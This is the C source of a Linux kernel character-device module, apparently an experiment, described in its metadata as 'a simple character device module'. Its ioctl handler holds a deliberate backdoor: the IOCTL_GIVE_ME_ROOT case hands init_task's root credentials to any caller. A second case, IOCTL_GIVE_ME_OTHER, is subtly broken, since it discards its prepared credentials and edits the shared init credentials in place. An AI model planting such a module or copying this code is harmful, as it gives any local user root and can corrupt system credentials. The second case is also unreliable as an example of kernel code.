/* mychardev.c */
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/fs.h>
#include <linux/cred.h>

#include "mychardev.h"
#define DEVICE_NAME "mychardev"

static int device_open(struct inode *inode, struct file *file)
{
    try_module_get(THIS_MODULE);
    return 0;
}

static int device_release(struct inode *inode, struct file *file)
{
    module_put(THIS_MODULE);
    return 0;
}

static ssize_t device_read(struct file *filp, char *buffer, size_t length, loff_t *offset)
{
    return -EINVAL;
}

static ssize_t device_write(struct file *filp, const char *buffer, size_t length, loff_t * offset)
{
    return -EINVAL;
}

long device_ioctl(struct file *file, unsigned int ioctl_num, unsigned long ioctl_param)
{
    switch (ioctl_num) {
    case IOCTL_GIVE_ME_ROOT:

        commit_creds((struct cred*)get_task_cred(&init_task));
        return 0;
    
    case IOCTL_GIVE_ME_OTHER:
        struct cred *new_cred;
        new_cred = prepare_creds();
        new_cred->uid.val = 1000;        // ユーザAのUID
        new_cred->gid.val = 1000;        // ユーザAのGID
        new_cred->euid.val = 0;       // 有効UID
        new_cred->egid.val = 1000;       // 有効GID
        new_cred->suid.val = 0;       // 保存されたUID
        new_cred->sgid.val = 1000;       // 保存されたGID
        new_cred->fsuid.val = 0;      // ファイルシステムのUID
        new_cred->fsgid.val = 1000;      // ファイルシステムのGID

        new_cred = (struct cred*)get_task_cred(&init_task);
        new_cred->uid.val = 1000;

        commit_creds(new_cred);
        return 0;
    }
    return -EINVAL;
}

static struct file_operations fops = {
    .open = device_open,
    .release = device_release,
    .read = device_read,
    .write = device_write,
    .unlocked_ioctl = device_ioctl,
};

int init_module(void)
{
    int ret_val;
    ret_val = register_chrdev(MAJOR_NUM, DEVICE_NAME, &fops);
    if (ret_val < 0) {
        printk(KERN_ALERT "Registering char device failed with %d\n", ret_val);
        return ret_val;
    }
    printk(KERN_INFO "try 'sudo mknod %s c %d 0'\n", DEVICE_FILE_NAME, MAJOR_NUM);
    return 0;
}

void cleanup_module(void)
{
    unregister_chrdev(MAJOR_NUM, DEVICE_NAME);
}

MODULE_LICENSE("GPL"); // Add this line to specify the module license
MODULE_AUTHOR("Your Name"); // Optional: Add this line to specify the author
MODULE_DESCRIPTION("A simple character device module"); // Optional: Add this line to describe the module
